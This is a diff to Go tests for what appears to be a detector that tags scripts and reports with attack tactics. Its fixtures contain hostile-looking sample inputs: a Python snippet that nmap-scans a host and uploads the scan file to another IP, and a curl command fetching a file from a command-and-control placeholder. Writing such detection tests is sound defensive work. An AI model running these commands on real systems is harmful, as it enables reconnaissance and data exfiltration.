@@ -159,7 +159,7 @@ func TestBuildPython(t *testing.T) {
 			"OUT = \"scan.txt\"\n" +
 			"subprocess.run([\"nmap\", \"-sV\", \"10.20.1.5\", \"-oN\", OUT])\n" +
 			"blob = base64.b64encode(open(OUT, \"rb\").read())\n",
-		"beacon": "#!/usr/bin/env python3\nimport requests\nrequests.post(\"http://10.20.1.9/up\", data=b\"x\")\n",
+		"beacon": "#!/usr/bin/env python3\nimport requests\nrequests.post(\"http://10.20.1.9/up\", files={\"f\": open(\"scan.txt\", \"rb\")})\n",
 	}
 	tables := loadTables(t)
 	steps := map[string]Step{}
@@ -245,7 +245,7 @@ func TestBuildStructuredReports(t *testing.T) {
 		{
 			name:       "xml",
 			file:       "export.xml",
-			text:       `<run><command>curl -s "http://c2.example/drop?a=1&amp;b=2"</command></run>`,
+			text:       `<run><command>curl -s -o drop "http://c2.example/drop?a=1&amp;b=2"</command></run>`,
 			tools:      []string{"curl"},
 			indicators: 2,
 			hit:        "http://c2.example/drop?a=1&b=2",
@@ -328,8 +328,8 @@ func TestBuildActivities(t *testing.T) {
 	if len(script.Activities) != 1 || script.Activities[0].Name != "AppCredentialAddition" || script.Activities[0].Lines != 2 {
 		t.Errorf("grant.ps1 activities = %+v, want AppCredentialAddition on 2 lines", script.Activities)
 	}
-	// The command table gives Exfiltration and Persistence; the activity adds nothing twice.
-	if got, want := script.Tactics, []string{"Exfiltration", "Persistence"}; !slices.Equal(got, want) {
+	// The cmdlet and the activity both say Persistence; it is listed once.
+	if got, want := script.Tactics, []string{"Persistence"}; !slices.Equal(got, want) {
 		t.Errorf("grant.ps1 tactics = %q, want %q", got, want)
 	}
 	log := steps["agent.jsonl"]
